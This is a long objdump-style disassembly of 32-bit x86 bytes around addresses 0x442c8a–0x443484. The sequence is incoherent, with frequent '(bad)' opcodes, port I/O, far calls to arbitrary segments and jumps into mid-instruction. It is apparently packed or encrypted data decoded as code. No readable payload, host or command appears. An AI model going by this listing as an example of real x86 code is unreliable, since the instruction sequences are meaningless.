  442c8a:	arpl   WORD PTR [eax-0x3cb0a15d],cx
  442c90:	sub    eax,0x9f2e3420
  442c95:	or     eax,0xc231b772
  442c9a:	leave  
  442c9b:	out    dx,eax
  442c9c:	sbb    ah,ah
  442c9e:	pop    edx
  442c9f:	xchg   edi,eax
  442ca0:	mov    esi,DWORD PTR [eax+0x16]
  442ca3:	out    0x1b,eax
  442ca5:	das    
  442ca6:	out    dx,al
  442ca7:	aad    0x94
  442ca9:	jns    0x442c96
  442cab:	inc    sp
  442cad:	stos   BYTE PTR es:[edi],al
  442cae:	dec    esp
  442caf:	and    al,0xbf
  442cb1:	jbe    0x442cb7
  442cb3:	pop    eax
  442cb4:	sub    eax,ebx
  442cb6:	or     ebx,DWORD PTR [ebp-0x2cdf55a2]
  442cbc:	shr    ah,cl
  442cbe:	inc    esp
  442cbf:	call   ebx
  442cc1:	mov    dh,0xbd
  442cc3:	jmp    0x442d1a
  442cc5:	cmp    ebx,DWORD PTR [ecx+edi*2+0x6e78ce50]
  442ccc:	add    DWORD PTR ds:0xd3c6c487,eax
  442cd2:	shr    DWORD PTR [edi-0x7d],0xf2
  442cd6:	adc    ebx,DWORD PTR [edx]
  442cd8:	sub    cl,0xee
  442cdb:	or     edi,ecx
  442cdd:	call   0xbe2127d
  442ce2:	and    ebx,eax
  442ce4:	call   0xf68c:0x9388e318
  442ceb:	sti    
  442cec:	outs   dx,DWORD PTR ds:[esi]
  442ced:	pusha  
  442cee:	fdivrp st(4),st
  442cf0:	mov    esi,0x7518eb93
  442cf5:	mov    dh,0xd6
  442cf7:	in     al,0xa6
  442cf9:	ds shr edx,cl
  442cfc:	jae    0x442cdf
  442cfe:	rcl    eax,1
  442d00:	cld    
  442d01:	pop    eax
  442d02:	lea    esp,[edi-0x659b4b49]
  442d08:	clc    
  442d09:	or     BYTE PTR [edx+0x4eeb3c75],0xb1
  442d10:	and    BYTE PTR [edx+0x7b89bca2],ch
  442d16:	sbb    DWORD PTR [edx+0x358103ab],ecx
  442d1c:	push   eax
  442d1d:	inc    ebp
  442d1e:	scas   eax,DWORD PTR es:[edi]
  442d1f:	call   0xd3ab337e
  442d24:	shr    BYTE PTR [ecx],cl
  442d26:	aaa    
  442d27:	lods   al,BYTE PTR ds:[esi]
  442d28:	(bad)  [esi]
  442d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442d2b:	add    BYTE PTR [esi-0x38],cl
  442d2e:	jl     0x442dac
  442d30:	xchg   edx,eax
  442d31:	add    BYTE PTR [ecx+0x52],0x5c
  442d35:	pop    ss
  442d36:	fcomp  DWORD PTR [ecx+0x57d33cf1]
  442d3c:	popf   
  442d3d:	std    
  442d3e:	repz neg ebx
  442d41:	pop    ecx
  442d42:	scas   eax,DWORD PTR es:[edi]
  442d43:	lahf   
  442d44:	or     edx,DWORD PTR [esi]
  442d46:	iret   
  442d47:	out    0xbb,eax
  442d49:	pop    ss
  442d4a:	dec    ecx
  442d4b:	xchg   esp,eax
  442d4c:	dec    edx
  442d4d:	adc    eax,0xca79282
  442d52:	inc    eax
  442d53:	and    DWORD PTR [esi-0x24],ebp
  442d56:	adc    BYTE PTR [ebx+eax*2],0xa0
  442d5a:	into   
  442d5b:	test   al,0x70
  442d5d:	rol    bh,cl
  442d5f:	inc    edi
  442d60:	jmp    FWORD PTR [edx-0x68597657]
  442d66:	push   cs
  442d67:	lock add eax,0xb502a71e
  442d6d:	adc    al,0xdf
  442d6f:	and    al,0xc0
  442d71:	rcl    BYTE PTR [edi-0x789a1284],cl
  442d77:	adc    DWORD PTR [eax+0x3e],esp
  442d7a:	cmp    edx,DWORD PTR [edi-0x40]
  442d7d:	jne    0x442dac
  442d7f:	call   0xd0b2:0xea255dd3
  442d86:	jne    0x442d8b
  442d88:	jmp    0x442df7
  442d8a:	ja     0x442d8a
  442d8c:	call   0xe37:0x6fbdb0dd
  442d93:	aas    
  442d94:	test   ch,bh
  442d96:	iret   
  442d97:	loopne 0x442dee
  442d99:	inc    esi
  442d9a:	je     0x442da8
  442d9c:	iret   
  442d9d:	dec    ebx
  442d9e:	xor    DWORD PTR [edi+0x40f33c7],esi
  442da4:	mov    dl,0x36
  442da6:	mov    edi,0x3998c410
  442dab:	sub    BYTE PTR [edi],ah
  442dad:	test   BYTE PTR [esi+ecx*1+0x5d],al
  442db1:	mov    ecx,0xe2d382eb
  442db6:	cdq    
  442db7:	cmc    
  442db8:	cli    
  442db9:	jecxz  0x442d7d
  442dbb:	sub    BYTE PTR [edi+0x62],bh
  442dbe:	sbb    ch,bl
  442dc0:	pop    edi
  442dc1:	dec    edx
  442dc2:	mov    esi,0xa0ca558f
  442dc7:	sub    al,0xda
  442dc9:	xchg   ecx,eax
  442dca:	cmp    bl,al
  442dcc:	sbb    BYTE PTR [eax+esi*2-0x67],0x47
  442dd1:	out    0xf0,al
  442dd3:	pop    esi
  442dd4:	fcmovu st,st(0)
  442dd6:	dec    esp
  442dd7:	pop    edx
  442dd8:	std    
  442dd9:	or     ebx,DWORD PTR [ecx+0x8321816]
  442ddf:	in     eax,dx
  442de0:	out    dx,al
  442de1:	stos   DWORD PTR es:[edi],eax
  442de2:	and    ebx,ecx
  442de4:	ja     0x442e09
  442de6:	or     eax,0xb871d59e
  442deb:	push   esp
  442dec:	jl     0x442e61
  442dee:	pop    ebp
  442def:	nop
  442df0:	push   DWORD PTR [edi]
  442df2:	jne    0x442e00
  442df4:	les    edx,FWORD PTR [ebp+0x7c360f4]
  442dfa:	int3   
  442dfb:	pop    es
  442dfc:	inc    ebx
  442dfd:	sbb    eax,0x53757e1d
  442e02:	pop    edx
  442e03:	scas   eax,DWORD PTR es:[edi]
  442e04:	or     BYTE PTR [edx-0x46398144],dh
  442e0a:	inc    ebx
  442e0b:	fstp   st(3)
  442e0d:	add    BYTE PTR [ebx+0x36],cl
  442e10:	jecxz  0x442e25
  442e12:	out    0xd5,al
  442e14:	xor    dh,cl
  442e16:	sbb    eax,0x5e846b2c
  442e1b:	sbb    edi,DWORD PTR [ecx+0x384d52f4]
  442e21:	mov    esi,ss
  442e23:	pop    es
  442e24:	sbb    al,0x1e
  442e26:	jno    0x442deb
  442e28:	jmp    0x442e67
  442e2a:	lods   eax,DWORD PTR ds:[esi]
  442e2b:	ffreep st(7)
  442e2d:	push   es
  442e2e:	jns    0x442e80
  442e30:	out    dx,eax
  442e31:	js     0x442eae
  442e33:	add    eax,0x687460ea
  442e38:	pop    edx
  442e39:	test   eax,ebp
  442e3b:	xchg   esi,eax
  442e3c:	imul   eax,DWORD PTR [eax-0x62f84b33],0x1b7ae06f
  442e46:	mov    esi,DWORD PTR [ecx-0x3c]
  442e49:	mov    dl,0x1c
  442e4b:	stos   BYTE PTR es:[edi],al
  442e4c:	jecxz  0x442e62
  442e4e:	push   0xf
  442e50:	mov    eax,0xd1c9c724
  442e55:	sbb    edi,DWORD PTR [eax+edi*2]
  442e58:	out    0xfb,al
  442e5a:	pop    eax
  442e5b:	mov    ds,WORD PTR [edx]
  442e5d:	xchg   edi,eax
  442e5e:	ret    
  442e5f:	std    
  442e60:	xor    eax,DWORD PTR [esi]
  442e62:	loop   0x442e82
  442e64:	add    al,0x84
  442e66:	fistp  DWORD PTR [esi+edi*4-0x42b8334]
  442e6d:	xchg   edx,eax
  442e6e:	je     0x442ea2
  442e70:	jecxz  0x442e3e
  442e72:	fldenv [edi-0x19]
  442e75:	pop    ebp
  442e76:	in     eax,dx
  442e77:	dec    ebx
  442e78:	mov    edx,0x57767508
  442e7d:	ret    
  442e7e:	adc    ah,al
  442e80:	and    eax,0xd726ee7f
  442e85:	pop    es
  442e86:	push   edx
  442e87:	arpl   WORD PTR [eax],sp
  442e89:	jl     0x442ea3
  442e8b:	loopne 0x442e44
  442e8d:	loop   0x442e7d
  442e8f:	(bad)  
  442e90:	dec    ecx
  442e91:	add    BYTE PTR [esi],0xe
  442e94:	je     0x442ea5
  442e96:	retf   
  442e97:	bound  edi,QWORD PTR [ebp+0x12]
  442e9a:	shl    BYTE PTR [edx+0x2e],cl
  442e9d:	nop
  442e9e:	mov    eax,ds:0xb78d66fe
  442ea3:	dec    esi
  442ea4:	jo     0x442e85
  442ea6:	loope  0x442e68
  442ea8:	jae    0x442ecd
  442eaa:	pop    ss
  442eab:	int    0xdb
  442ead:	mov    ah,0xde
  442eaf:	cs dec esp
  442eb1:	push   eax
  442eb2:	shr    esp,1
  442eb4:	cdq    
  442eb5:	cmp    dl,dl
  442eb7:	add    eax,0xd0cb7e50
  442ebc:	and    BYTE PTR ds:0xb877e74d,cl
  442ec2:	or     cl,0x29
  442ec5:	pushf  
  442ec6:	lock (bad) [ebx+0x7ae7783b]
  442ecd:	push   ebp
  442ece:	(bad)  
  442ecf:	jmp    0x8378:0x4c291298
  442ed6:	cmp    DWORD PTR [esi],ebp
  442ed8:	mov    al,ds:0xbc600232
  442edd:	aaa    
  442ede:	clc    
  442edf:	adc    ecx,esi
  442ee1:	ficom  DWORD PTR [esi-0x5d]
  442ee4:	cmp    DWORD PTR [edi],edi
  442ee6:	retf   0x9ab2
  442ee9:	and    BYTE PTR [ebx-0x1ea6aeb0],bh
  442eef:	jo     0x442ef0
  442ef1:	iret   
  442ef2:	and    ch,BYTE PTR [ebp+0x2127eddd]
  442ef8:	clc    
  442ef9:	jo     0x442f51
  442efb:	mov    eax,0x510241f9
  442f00:	mov    ch,0x31
  442f02:	test   al,0xf2
  442f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442f05:	and    BYTE PTR [esi+ecx*4],0xf2
  442f09:	inc    esi
  442f0a:	ds xchg esi,eax
  442f0c:	and    esp,DWORD PTR [ebx]
  442f0e:	outs   dx,DWORD PTR ds:[esi]
  442f0f:	jg     0x442ecf
  442f11:	cmp    BYTE PTR [edx],bh
  442f13:	jno    0x442f69
  442f15:	pop    eax
  442f16:	sbb    eax,0x59196783
  442f1b:	dec    ebx
  442f1c:	dec    edi
  442f1d:	mov    eax,0xa437ca17
  442f22:	and    BYTE PTR [eax],ch
  442f24:	fiadd  DWORD PTR [edi+0x51e74b70]
  442f2a:	dec    esp
  442f2b:	in     al,0x6a
  442f2d:	add    ebx,DWORD PTR [edx-0x39a330e7]
  442f33:	test   BYTE PTR [eax-0x27e881a6],cl
  442f39:	int3   
  442f3a:	inc    esp
  442f3b:	into   
  442f3c:	cmp    BYTE PTR [ebx+ebx*4],ah
  442f3f:	xor    eax,ecx
  442f41:	jle    0x442f39
  442f43:	mov    bh,0xcc
  442f45:	jmp    0x442fa1
  442f47:	xchg   esi,eax
  442f48:	push   cs
  442f49:	adc    eax,DWORD PTR [ecx]
  442f4b:	pusha  
  442f4c:	pop    eax
  442f4d:	popf   
  442f4e:	xchg   ebx,eax
  442f4f:	inc    ecx
  442f50:	xchg   ebp,eax
  442f51:	mov    edi,es
  442f53:	and    edx,edi
  442f55:	inc    eax
  442f56:	retf   0x5abb
  442f59:	ficom  DWORD PTR [ecx]
  442f5b:	pop    ebp
  442f5c:	sti    
  442f5d:	push   ebx
  442f5e:	repnz daa 
  442f60:	add    ebp,0xa1e31d49
  442f66:	xchg   ebx,eax
  442f67:	xor    eax,0x53bbf640
  442f6c:	jmp    0xced0:0x3c037c09
  442f73:	jmp    0x5aff:0x794a924f
  442f7a:	dec    ebp
  442f7b:	shr    BYTE PTR [ebp-0x4b0443d7],0x12
  442f82:	mov    ah,0x28
  442f84:	mov    BYTE PTR cs:[edi-0xc9d1bcf],ah
  442f8b:	push   esp
  442f8c:	and    BYTE PTR [ecx+ecx*4+0x59],dh
  442f90:	rcl    edx,1
  442f92:	out    dx,eax
  442f93:	mov    cl,0xac
  442f95:	sahf   
  442f96:	enter  0xbcdb,0x40
  442f9a:	jbe    0x442f84
  442f9c:	cli    
  442f9d:	mov    al,ds:0xdc9abd3d
  442fa2:	push   esp
  442fa3:	ss sbb al,0xda
  442fa6:	iret   
  442fa7:	fmul   st,st(6)
  442fa9:	inc    ecx
  442faa:	ds jnp 0x442f35
  442fad:	sbb    ecx,DWORD PTR [ebx+0x2120ccdf]
  442fb3:	idiv   bh
  442fb5:	or     edx,eax
  442fb7:	dec    eax
  442fb8:	dec    esp
  442fb9:	mov    esp,0x18b8a182
  442fbe:	pop    ds
  442fbf:	fsubp  st(3),st
  442fc1:	push   edx
  442fc2:	fs ret 
  442fc4:	lds    ebx,FWORD PTR [edx+0x504cd2fa]
  442fca:	(bad)
  442fce:	in     al,0x54
  442fd0:	jo     0x44301a
  442fd2:	xor    BYTE PTR [esi],0x86
  442fd5:	push   eax
  442fd6:	inc    esi
  442fd7:	cmp    al,0x2e
  442fd9:	rcl    cl,0xe7
  442fdc:	daa    
  442fdd:	in     eax,0x4d
  442fdf:	popf   
  442fe0:	adc    esi,DWORD PTR [edx+0x13a8f838]
  442fe6:	out    dx,al
  442fe7:	inc    eax
  442fe8:	das    
  442fe9:	out    dx,al
  442fea:	test   eax,0xff289aa1
  442fef:	test   DWORD PTR [edx-0x13],ecx
  442ff2:	xor    esi,DWORD PTR [edx]
  442ff4:	ret    0x90d
  442ff7:	push   0x2a3fbe50
  442ffc:	pop    eax
  442ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442ffe:	and    ecx,esp
  443000:	mov    eax,ds:0xe8aa5080
  443005:	ret    0x93f7
  443008:	popf   
  443009:	je     0x443017
  44300b:	sub    al,0x9e
  44300d:	push   cs
  44300e:	xchg   edx,eax
  44300f:	ret    0xd93d
  443012:	jg     0x44303d
  443014:	arpl   WORD PTR [ecx-0x28],di
  443017:	retf   0x4292
  44301a:	mov    ds:0x289b80b8,eax
  44301f:	sahf   
  443020:	fdivr  DWORD PTR [edx+0x517cd468]
  443026:	pop    edi
  443027:	enter  0x9d79,0x55
  44302b:	push   es
  44302c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44302d:	mov    bl,0xcc
  44302f:	pop    ebp
  443030:	xor    al,0xa5
  443032:	(bad)  
  443033:	loopne 0x44306e
  443035:	(bad)  
  443036:	jae    0x442ff8
  443038:	xchg   esi,eax
  443039:	imul   edx,DWORD PTR [ebx+0x190aff1e],0x80e60d88
  443043:	xor    bh,al
  443045:	mov    edx,0x4ff618d
  44304a:	jbe    0x4430ab
  44304c:	xor    eax,DWORD PTR [eax+0x42]
  44304f:	jae    0x442fe7
  443051:	pop    ss
  443052:	lods   eax,DWORD PTR ds:[esi]
  443053:	ret    
  443054:	in     eax,dx
  443055:	or     eax,DWORD PTR [ebp+ecx*4+0x568c5ba4]
  44305c:	mov    bh,0x7f
  44305e:	fild   QWORD PTR [ebx-0x4330155b]
  443064:	in     eax,dx
  443065:	sbb    ebx,ebx
  443067:	pop    edi
  443068:	xor    DWORD PTR [ecx+ecx*2-0x2383508a],esp
  44306f:	xchg   esp,eax
  443070:	sub    ebx,ebp
  443072:	std    
  443073:	shl    cl,cl
  443075:	pop    edi
  443076:	stc    
  443077:	into   
  443078:	fstp   TBYTE PTR [ecx+0x23ac1868]
  44307e:	inc    esi
  44307f:	fwait
  443080:	xchg   edx,eax
  443081:	cmp    BYTE PTR [eax],dl
  443083:	adc    dh,BYTE PTR [ebx+0x51]
  443086:	inc    esi
  443087:	push   cs
  443088:	mov    ebx,cs
  44308a:	cmp    DWORD PTR [ebp-0xbee7a62],0xfffffff1
  443091:	out    dx,al
  443092:	arpl   WORD PTR [eax],cx
  443094:	js     0x443077
  443096:	cmp    edx,eax
  443098:	inc    eax
  443099:	ja     0x443089
  44309b:	and    eax,0x8972aa4f
  4430a0:	ret    0xf285
  4430a3:	dec    eax
  4430a4:	sub    al,0xb2
  4430a6:	(bad)  
  4430a7:	xor    DWORD PTR [edi-0x6e8f02cd],edx
  4430ad:	lock mov dh,0xc
  4430b0:	push   0x7b
  4430b2:	xchg   ecx,eax
  4430b3:	test   al,0x8f
  4430b5:	pop    ecx
  4430b6:	sbb    al,0xa7
  4430b8:	aas    
  4430b9:	pop    edx
  4430ba:	inc    edi
  4430bb:	jp     0x443127
  4430bd:	div    BYTE PTR [ebp-0x38664bd7]
  4430c3:	inc    ebx
  4430c4:	test   eax,0xcbf4d43b
  4430c9:	xchg   esp,eax
  4430ca:	sub    eax,0x2a56d169
  4430cf:	mov    bh,0xdc
  4430d1:	popa   
  4430d2:	jle    0x443097
  4430d4:	and    DWORD PTR [ebp+0x3efd629e],esi
  4430da:	inc    ebp
  4430db:	mov    ch,0x5c
  4430dd:	cmp    BYTE PTR [ebx+0x5959f409],ch
  4430e3:	sar    ecx,cl
  4430e5:	cmp    DWORD PTR [edi+0x6d6e0eb0],edi
  4430eb:	lds    edx,FWORD PTR [esi-0x12cb9ff0]
  4430f1:	(bad)  
  4430f3:	xchg   esi,eax
  4430f4:	mov    esi,0xc7cc1536
  4430f9:	sbb    eax,0x5e348cfe
  4430fe:	mov    fs,WORD PTR [esi]
  443100:	out    dx,al
  443101:	repz call 0x97c9:0xe9d79e7b
  443109:	cli    
  44310a:	popa   
  44310b:	adc    al,0x7c
  44310d:	push   cs
  44310e:	sar    dh,0x1e
  443111:	(bad)  
  443112:	push   edx
  443113:	popa   
  443114:	or     al,0x59
  443116:	mov    ds:0x3e1a889d,eax
  44311b:	mov    edx,0x28e3d8b8
  443120:	push   ss
  443121:	pop    ss
  443122:	loope  0x44312e
  443124:	data16 add cl,cl
  443127:	lock fadd DWORD PTR [ecx-0x44]
  44312b:	retf   
  44312c:	pop    ds
  44312d:	dec    ebp
  44312e:	lahf   
  44312f:	pop    ebx
  443130:	add    al,0xb4
  443132:	sub    ecx,DWORD PTR [ecx-0x26]
  443135:	std    
  443136:	iret   
  443137:	jo     0x443167
  443139:	fld    TBYTE PTR [edi]
  44313b:	lahf   
  44313c:	loopne 0x443113
  44313e:	pusha  
  44313f:	out    0xae,eax
  443141:	inc    ebp
  443142:	adc    ecx,edi
  443144:	sbb    edx,DWORD PTR [esi-0x12]
  443147:	sti    
  443148:	fs ret 0x985e
  44314c:	sar    BYTE PTR [edi+0x2d0c50ce],1
  443152:	test   eax,0x8f5cb502
  443158:	test   BYTE PTR [eax+ebx*2+0x7cb8d8a2],bl
  44315f:	jl     0x4430ff
  443161:	imul   esp,DWORD PTR [ebx-0x6b5c7f66],0xffffffb5
  443168:	jb     0x443114
  44316a:	xchg   ebp,eax
  44316b:	ret    0xaef7
  44316e:	call   0x3fe7:0xda1708d3
  443175:	cmp    al,0xcd
  443177:	add    DWORD PTR ds:0x287d3089,ebx
  44317d:	stos   BYTE PTR es:[edi],al
  44317e:	(bad)  
  443180:	pop    ebx
  443181:	scas   eax,DWORD PTR es:[edi]
  443182:	test   BYTE PTR [esi+0x56],0x8e
  443186:	jb     0x443123
  443188:	in     al,0xd6
  44318a:	push   ebx
  44318b:	jmp    0x44317f
  44318d:	ds mov al,es:0x1eff8a50
  443194:	fmul   DWORD PTR [esi+0x545860cd]
  44319a:	dec    esi
  44319b:	shl    ch,1
  44319d:	enter  0x8f88,0x39
  4431a1:	mov    dh,0xf9
  4431a3:	xchg   ecx,eax
  4431a4:	out    0xa6,al
  4431a6:	(bad)  
  4431a7:	daa    
  4431a8:	jo     0x4431e9
  4431aa:	es ins BYTE PTR es:[edi],dx
  4431ac:	out    0xd3,al
  4431ae:	(bad)  
  4431af:	hlt    
  4431b0:	nop
  4431b1:	dec    edx
  4431b2:	sahf   
  4431b3:	lock push esp
  4431b5:	push   es
  4431b6:	jmp    0x175cc556
  4431bb:	rol    BYTE PTR [ebp-0x62],0x6d
  4431bf:	test   BYTE PTR [ebx],al
  4431c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4431c2:	cmp    ebx,DWORD PTR [esi+0x663aa600]
  4431c8:	or     BYTE PTR [ecx],dh
  4431ca:	cld    
  4431cb:	dec    ebx
  4431cc:	cli    
  4431cd:	out    0x50,eax
  4431cf:	fst    st(2)
  4431d1:	mov    dl,0x4f
  4431d3:	lahf   
  4431d4:	ds mov cl,0x6
  4431d7:	fdivr  QWORD PTR [edx+0x315c1c26]
  4431dd:	adc    eax,0xc5b0e009
  4431e2:	shl    DWORD PTR [edi-0x80],0xc1
  4431e6:	das    
  4431e7:	test   eax,0xd90ae7ed
  4431ec:	mov    BYTE PTR ds:0x4006d2db,cl
  4431f2:	mul    DWORD PTR [esi+0x155aafc3]
  4431f8:	jnp    0x443242
  4431fa:	adc    cl,bh
  4431fc:	mov    esp,0x6e3142d1
  443201:	adc    al,0x9a
  443203:	mov    ebx,DWORD PTR [ebx+0x74]
  443206:	push   esi
  443207:	dec    ecx
  443208:	into   
  443209:	cmp    ch,dl
  44320b:	sahf   
  44320c:	add    dl,ah
  44320e:	pusha  
  44320f:	mov    ds:0x4069fc88,al
  443214:	xchg   DWORD PTR [esi-0x3226b3a9],ecx
  44321a:	xchg   BYTE PTR [ecx],dh
  44321c:	inc    edx
  44321d:	mov    ecx,0xf0e2cda7
  443222:	shl    DWORD PTR [ecx],cl
  443224:	imul   ebp,esi,0x1a4e4ed8
  44322a:	mov    BYTE PTR [edi+0x1b],dl
  44322d:	or     BYTE PTR ds:0x6f49f3ce,ah
  443233:	call   0x72b6:0xa239488c
  44323a:	pop    ds
  44323b:	arpl   WORD PTR [edi+ecx*8+0x2],bp
  44323f:	test   DWORD PTR [esi],edi
  443241:	or     al,0x38
  443243:	pop    edi
  443244:	fst    DWORD PTR [eax+0x6c6dc794]
  44324a:	int    0x21
  44324c:	arpl   WORD PTR [esi+0x48],bp
  44324f:	dec    ecx
  443250:	ja     0x4431ee
  443252:	mov    ecx,0x9d24d9db
  443257:	mov    ds:0x98ee0616,eax
  44325c:	mov    bl,0x60
  44325e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44325f:	lods   eax,DWORD PTR ds:[esi]
  443260:	pop    ebx
  443261:	mov    esp,0xbc38dc29
  443266:	mov    cl,0x54
  443268:	in     al,0x77
  44326a:	inc    BYTE PTR [ebp+0x517d53f0]
  443270:	into   
  443271:	loopne 0x44323b
  443273:	mov    ah,0x4b
  443275:	mov    bl,0x43
  443277:	sbb    al,0xb8
  443279:	xor    DWORD PTR [eax-0x60a5d519],edi
  44327f:	repz push ebp
  443281:	cdq    
  443282:	xchg   edx,eax
  443283:	das    
  443284:	push   ss
  443285:	xor    al,0x62
  443287:	jg     0x4432e7
  443289:	popf   
  44328a:	dec    edx
  44328b:	adc    al,0x72
  44328d:	or     al,0x4d
  44328f:	call   0x2cf1:0x8705b854
  443296:	xor    ah,dl
  443298:	push   cs
  443299:	or     dl,BYTE PTR [ebx-0x5c7bb1c5]
  44329f:	or     BYTE PTR [ecx-0x1aaf239d],cl
  4432a5:	xchg   BYTE PTR [eax+0x15234cb0],cl
  4432ab:	mov    ds:0xaeb97867,eax
  4432b0:	sub    cl,BYTE PTR [eax-0x6]
  4432b3:	in     al,dx
  4432b4:	retf   
  4432b5:	mov    bh,0x65
  4432b7:	into   
  4432b8:	dec    esi
  4432b9:	mov    edx,0xc61ed562
  4432be:	mov    al,ds:0xae7aa237
  4432c3:	(bad)  
  4432c4:	fs xchg edx,eax
  4432c6:	ror    BYTE PTR [edi+0x143dab73],0x67
  4432cd:	mov    esp,ebx
  4432cf:	jecxz  0x443345
  4432d1:	xor    BYTE PTR [ebp-0x36],ch
  4432d4:	and    al,0xaa
  4432d6:	not    BYTE PTR [eax]
  4432d8:	neg    DWORD PTR [ebp-0x1a]
  4432db:	xchg   ebp,eax
  4432dc:	call   0x8854653f
  4432e1:	test   eax,0xd48d93e2
  4432e6:	outs   dx,DWORD PTR ds:[esi]
  4432e7:	icebp  
  4432e8:	test   edx,0xdf10367b
  4432ee:	repz xor al,0xe0
  4432f1:	jle    0x443295
  4432f3:	jo     0x443292
  4432f5:	outs   dx,DWORD PTR ds:[esi]
  4432f6:	xor    esi,DWORD PTR [esi+0x4ef0986e]
  4432fc:	push   ebp
  4432fd:	pop    ss
  4432fe:	test   esp,esi
  443300:	push   eax
  443301:	fld    QWORD PTR [ebp+ebx*2-0x58793c9b]
  443308:	pop    ecx
  443309:	lahf   
  44330a:	(bad)  
  44330b:	jecxz  0x443378
  44330d:	ds xchg edx,eax
  44330f:	and    DWORD PTR [esi-0x80],eax
  443312:	sub    BYTE PTR [edx-0x20e23e5c],cl
  443318:	push   ebx
  443319:	out    dx,eax
  44331a:	repz mov ds:0xe3ddd0ed,al
  443320:	cs daa 
  443322:	mov    bl,0x47
  443324:	fdivr  DWORD PTR [edx+0x22]
  443327:	add    DWORD PTR [edx+eiz*1],ecx
  44332a:	jmp    0x4432bf
  44332c:	ret    0x110f
  44332f:	sbb    eax,0xf14106d2
  443334:	push   esp
  443335:	gs fwait
  443337:	hlt    
  443338:	call   0xd00c:0x1c541b92
  44333f:	cwde   
  443340:	mov    ds:0xd54b1224,al
  443345:	xchg   esi,eax
  443346:	xchg   ecx,eax
  443347:	xchg   DWORD PTR [edi],ebp
  443349:	inc    ebx
  44334a:	lods   al,BYTE PTR ds:[esi]
  44334b:	fistp  QWORD PTR [edi+0x7c32e6ff]
  443351:	mov    ebx,0xf9a98cb8
  443356:	jnp    0x443378
  443358:	mov    ah,0x45
  44335a:	out    0xba,eax
  44335c:	ret    
  44335d:	(bad)  
  44335e:	test   al,0xe
  443360:	clc    
  443361:	iretw  
  443363:	outs   dx,DWORD PTR ds:[esi]
  443364:	xor    al,0xf3
  443366:	mov    DWORD PTR [ebx-0x31],edi
  443369:	enter  0xb104,0x97
  44336d:	jb     0x4433ec
  44336f:	sub    dh,ch
  443371:	jbe    0x4433aa
  443373:	push   ebx
  443374:	xchg   esp,eax
  443375:	jecxz  0x443318
  443377:	clc    
  443378:	(bad)  
  44337a:	dec    DWORD PTR [esi+ebp*2+0x9b20407]
  443381:	add    dh,ch
  443383:	dec    eax
  443384:	mov    esp,0xa99ae015
  443389:	xchg   esp,eax
  44338a:	adc    esi,DWORD PTR [ebx]
  44338c:	mov    ecx,0xa3325807
  443392:	out    0xd,al
  443394:	pop    eax
  443395:	outs   dx,BYTE PTR ds:[esi]
  443396:	and    ah,BYTE PTR [edx+ebp*4-0x6d]
  44339a:	jecxz  0x4433c5
  44339c:	dec    esi
  44339d:	inc    eax
  44339e:	push   eax
  44339f:	pop    esp
  4433a0:	mov    ds:0x2aebac5e,eax
  4433a5:	sub    bh,BYTE PTR [ebx]
  4433a7:	sbb    ebx,DWORD PTR [eax-0x735e9cf8]
  4433ad:	retf   0x7ce0
  4433b0:	lods   eax,DWORD PTR ds:[esi]
  4433b1:	sti    
  4433b2:	sahf   
  4433b3:	test   BYTE PTR [eax],dh
  4433b5:	repnz sbb al,0x87
  4433b8:	call   0x7005:0x46711c26
  4433bf:	jg     0x44337a
  4433c1:	push   edx
  4433c2:	ins    BYTE PTR es:[edi],dx
  4433c3:	push   ebp
  4433c4:	jmp    0xac72:0x4591312d
  4433cb:	fadd   QWORD PTR [ecx]
  4433cd:	mov    ?,edi
  4433cf:	pop    esp
  4433d0:	imul   BYTE PTR [esi]
  4433d2:	push   es
  4433d3:	fsub   st,st(1)
  4433d5:	fmul   DWORD PTR [edx+0x40]
  4433d8:	popa   
  4433d9:	imul   DWORD PTR [ebx-0x63]
  4433dc:	xlat   BYTE PTR ds:[ebx]
  4433dd:	js     0x4433f5
  4433df:	call   0x9c32:0xf5447527
  4433e6:	test   eax,0xd025dbfa
  4433eb:	mov    ds:0x57e8802b,al
  4433f0:	sub    dl,0xdc
  4433f3:	inc    eax
  4433f4:	int3   
  4433f5:	and    eax,DWORD PTR [esp+eax*1-0x780b9702]
  4433fc:	push   esp
  4433fd:	mov    cl,0x45
  4433ff:	xchg   esi,eax
  443400:	mov    bh,BYTE PTR [edx+0x5]
  443403:	pop    ebx
  443404:	sub    eax,0x5e715e93
  443409:	pop    ds
  44340a:	ds leave 
  44340c:	sbb    ch,BYTE PTR [edi-0x2e]
  44340f:	adc    DWORD PTR [edi],eax
  443411:	jmp    DWORD PTR [ecx+edi*8-0x5e]
  443415:	mov    ebp,0x22102cdf
  44341a:	sbb    BYTE PTR [ebx+0x13c2dfd2],0x46
  443421:	sub    bl,BYTE PTR [edi+0x74136f02]
  443427:	std    
  443428:	fisttp DWORD PTR [ebx]
  44342a:	das    
  44342b:	xchg   edi,eax
  44342c:	shr    DWORD PTR [edx-0x7b],cl
  44342f:	outs   dx,BYTE PTR ds:[esi]
  443430:	cmp    edi,edi
  443432:	in     al,0x6c
  443434:	dec    ah
  443436:	aas    
  443437:	lock not eax
  44343a:	dec    esi
  44343b:	jae    0x44349a
  44343d:	mov    edi,DWORD PTR [edi+edi*4-0x6fb405a0]
  443444:	aaa    
  443445:	js     0x44345e
  443447:	(bad)  
  443448:	cli    
  443449:	in     eax,0x83
  44344b:	jnp    0x4433df
  44344d:	mov    ds:0xe03d8fb8,eax
  443452:	int3   
  443453:	dec    esp
  443454:	scas   eax,DWORD PTR es:[edi]
  443455:	sti    
  443456:	jecxz  0x4434a0
  443458:	sbb    esp,DWORD PTR [esi+0x7b2969c1]
  44345e:	push   edi
  44345f:	xchg   edi,eax
  443460:	sti    
  443461:	rcr    BYTE PTR [edi+edi*8-0x75],cl
  443465:	outs   dx,DWORD PTR ds:[esi]
  443466:	sbb    ah,BYTE PTR [edi]
  443468:	inc    esp
  443469:	jl     0x443466
  44346b:	jg     0x443422
  44346d:	xlat   BYTE PTR ds:[ebx]
  44346e:	leave  
  44346f:	(bad)  
  443470:	jge    0x443445
  443472:	mov    esp,0xe032c394
  443477:	xor    DWORD PTR [eax+0x61c3901f],ecx
  44347d:	jnp    0x443402
  44347f:	add    al,0xc9
  443481:	scas   eax,DWORD PTR es:[edi]
  443482:	pop    ebp
  443483:	pop    esp
  443484:	rcl    DWORD PTR [ecx+0x76e743b3],1
